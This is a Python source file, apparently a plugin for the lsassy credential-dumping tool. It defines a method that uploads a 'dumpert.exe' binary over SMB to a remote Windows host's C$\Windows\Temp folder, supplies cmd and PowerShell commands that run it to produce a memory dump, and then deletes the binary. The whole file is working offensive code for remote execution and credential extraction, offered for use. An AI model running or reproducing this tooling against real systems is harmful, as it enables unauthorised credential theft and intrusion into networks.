import logging
import os

from lsassy.dumpmethod import IDumpMethod
from lsassy.impacketfile import ImpacketFile


class DumpMethod(IDumpMethod):
    custom_dump_path_support = False
    custom_dump_name_support = False

    dump_name = "dumpert.dmp"
    dump_share = "C$"
    dump_path = "\\Windows\\Temp\\"

    def __init__(self, session, timeout):
        super().__init__(session, timeout)
        self.dumpert = "dumpert.exe"
        self.dumpert_path = False
        self.dumpert_remote_share = "C$"
        self.dumpert_remote_path = "\\Windows\\Temp\\"

        self.dumpert_uploaded = False

    def prepare(self, options):
        self.dumpert = options.get("dumpert", self.dumpert)
        self.dumpert_path = options.get("dumpert_path", self.dumpert_path)
        self.dumpert_remote_share = options.get("dumpert_remote_share", self.dumpert_remote_share)
        self.dumpert_remote_path = options.get("dumpert_remote_path", self.dumpert_remote_path)

        if not self.dumpert_path:
            logging.error("Missing dumpert_path")
            return None

        if not os.path.exists(self.dumpert_path):
            logging.error("{} does not exist.".format(self.dumpert_path))
            return None

        # Upload dumpert
        logging.debug('Copy {} to {}'.format(self.dumpert_path, self.dumpert_remote_path))
        with open(self.dumpert_path, 'rb') as p:
            try:
                self._session.smb_session.putFile(self.dumpert_remote_share, self.dumpert_remote_path + self.dumpert, p.read)
                logging.success("dumpert successfully uploaded")
                self.dumpert_uploaded = True
                return True
            except Exception as e:
                logging.error("dumpert upload error", exc_info=True)
                return None

    def clean(self):
        if self.dumpert_uploaded:
            ImpacketFile.delete(self._session, self.dumpert_remote_path + self.dumpert, timeout=self._timeout)

    def get_commands(self):
        cmd_command = """{}{}""".format(self.dumpert_remote_path, self.dumpert)
        pwsh_command = cmd_command
        return {
            "cmd": cmd_command,
            "pwsh": pwsh_command
        }
